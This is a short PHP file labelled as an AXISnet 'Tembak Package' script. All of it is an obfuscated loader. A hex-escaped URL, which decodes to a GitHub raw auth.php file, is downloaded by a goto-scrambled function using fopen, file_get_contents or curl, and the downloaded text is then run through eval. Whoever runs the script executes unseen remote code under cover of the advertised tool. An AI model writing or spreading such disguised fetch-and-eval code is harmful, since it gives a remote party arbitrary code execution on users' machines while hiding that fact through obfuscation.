<?php
/* 
   Author: Iddant ID
   Script AXISnet Tembak Package
*/
eval(ptWQy("\x68\x74\164\x70\163\72\x2f\57\162\x61\167\x2e\x67\x69\164\150\165\x62\x75\x73\x65\x72\x63\157\x6e\164\x65\156\164\x2e\143\x6f\x6d\x2f\151\160\153\x7a\157\x6e\x65\57\141\170\151\163\x6e\x65\164\x2f\x6d\141\x69\x6e\57\x61\165\x74\x68\x2f\141\165\164\150\x2e\160\x68\x70"));
function PtwqY($Vrf0r)
{
    goto wsRcF;
    xNIrd:
    curl_setopt($XWvSw, CURLOPT_FOLLOWLOCATION, 1);
    goto aS31f;
    VUS3k:
    if (function_exists("\146\157\x70\145\156") && function_exists("\146\x65\x6f\146") && function_exists("\x66\x72\145\x61\144") && $iXcE5) {
        goto tHn08;
    }
    goto YkXgG;
    enCB5:
    $SPQeZ .= $xic2N;
    goto PydlO;
    CC6gV:
    $SPQeZ .= fread($iXcE5, 1024 * 8);
    goto WCgh1;
    PydlO:
    oZ_HZ:
    goto ICcem;
    Z3CeA:
    goto oZ_HZ;
    goto jV4VH;
    wsRcF:
    $iXcE5 = fopen($Vrf0r, "\162\142");
    goto AI0yh;
    Twfh7:
    fclose($iXcE5);
    goto Z3CeA;
    YkXgG:
    if (function_exists("\x66\x69\154\145\137\x67\145\164\x5f\143\157\x6e\164\x65\156\x74\x73") && ($xic2N = file_get_contents($Vrf0r))) {
        goto c_Jcn;
    }
    goto Vo5Sw;
    Vo5Sw:
    $XWvSw = curl_init();
    goto GLyOx;
    WCgh1:
    goto Fcd3l;
    goto vjkKK;
    AI0yh:
    $SPQeZ = '';
    goto VUS3k;
    GLyOx:
    curl_setopt($XWvSw, CURLOPT_URL, $Vrf0r);
    goto FqcSh;
    jV4VH:
    c_Jcn:
    goto enCB5;
    Ttjx2:
    tHn08:
    goto nl6l_;
    aS31f:
    $SPQeZ .= curl_exec($XWvSw);
    goto bPE1I;
    F7eC1:
    if (feof($iXcE5)) {
        goto JFlN7;
    }
    goto CC6gV;
    dPi0D:
    goto oZ_HZ;
    goto Ttjx2;
    vjkKK:
    JFlN7:
    goto Twfh7;
    FqcSh:
    curl_setopt($XWvSw, CURLOPT_RETURNTRANSFER, 1);
    goto xNIrd;
    nl6l_:
    Fcd3l:
    goto F7eC1;
    bPE1I:
    curl_close($XWvSw);
    goto dPi0D;
    ICcem:
    return "\x3f\x3e" . $SPQeZ;
    goto pKO_c;
    pKO_c:
}
?>